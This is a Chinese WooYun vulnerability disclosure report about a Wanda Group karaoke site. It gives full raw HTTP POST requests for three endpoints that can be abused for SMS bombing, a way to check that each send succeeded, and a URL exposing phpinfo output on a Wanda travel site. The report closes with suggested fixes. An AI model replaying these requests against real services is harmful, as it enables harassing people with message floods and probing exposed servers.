wybug_title: 万达某站存在三处短信轰炸+信息泄露
wybug_corp: 大连万达集团股份有限公司
wybug_detail:
漏洞详情 披露状态：   									2014-12-17：	细节已通知厂商并且等待厂商处理中									2014-12-17：	厂商已经确认，细节仅向厂商公开									2014-12-27：	细节向核心白帽子及相关领域专家公开									2015-01-06：	细节向普通白帽子公开									2015-01-16：	细节向实习白帽子公开									2015-01-31：	细节向公众公开  简要描述： 万达某站存在三处短信轰炸+信息泄露 详细说明：  万达大歌星页面轰炸接口一、用户手机绑定处http://www.dagexing.com/qq_qqOauthBack.do?code=D92DAFB5CBD1301544402A61F841BD08&state=3a2918360a82b35b6cd3a849e2c549ee

POST http://www.dagexing.com/MemQQSinaManage_sendCaptcha.do HTTP/1.1Host: www.dagexing.comProxy-Connection: keep-aliveContent-Length: 21Accept: */*Origin: http://www.dagexing.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.dagexing.com/qq_qqOauthBack.do?code=D92DAFB5CBD1301544402A61F841BD08&state=3a2918360a82b35b6cd3a849e2c549eeAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=C4BE*********79F8B5390B0.jvm2; city_id=e7dd34fe-84c2-4813-a334-38cc0c5663ef; city_name=%E5%8C************; company_id=7; Hm_lvt_d50ec372abfd668bc91b8977bffcd968=1418800075,1418806996,1418807011,1418807020; Hm_lpvt_d50ec372abfd668bc91b8977bffcd968=1418807024telephone=186********

轰炸接口二、一键订房功能POST http://www.dagexing.com/QuickOrderManage_sendCaptcha.do HTTP/1.1Host: www.dagexing.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.dagexing.com/QuickOrderManage_initAddOrder.doContent-Length: 21Cookie: JSESSIONID=E5E5DB9786DD*******.jvm1; Hm_lvt_d50ec372abfd668bc91b8977bffcd968=1418804368; Hm_lpvt_d50ec372abfd668bc91b8977bffcd968=1418806969Connection: keep-alivePragma: no-cacheCache-Control: no-cachetelephone=186******





轰炸接口三、大歌星忘记密码处会发送短信的方式重置密码

POST http://www.dagexing.com/MemberRegisterAction_getBackPassword.do HTTP/1.1Host: www.dagexing.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/plain, */*; q=0.01Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.dagexing.com/memberLogin.jspContent-Length: 34Cookie: JSESSIONID=E5E5DB9786DD1F***********C101413F.jvm1; Hm_lvt_d50ec372abfd668bc91b8977bffcd968=1418804368; Hm_lpvt_d50ec372abfd668bc91b8977bffcd968=1418808101Connection: keep-alivePragma: no-cacheCache-Control: no-cacheidentifyType=EXT&token=186******通过返回值200和ok判断是否发送成功



phpinfo信息泄露：万达国际旅游http://www.wonder-tour.com/p.php

   漏洞证明：  已经证明   修复方案：  限制发送次数 加强验证机制删除敏感信息   版权声明：转载请注明来源 Mr.leo@乌云
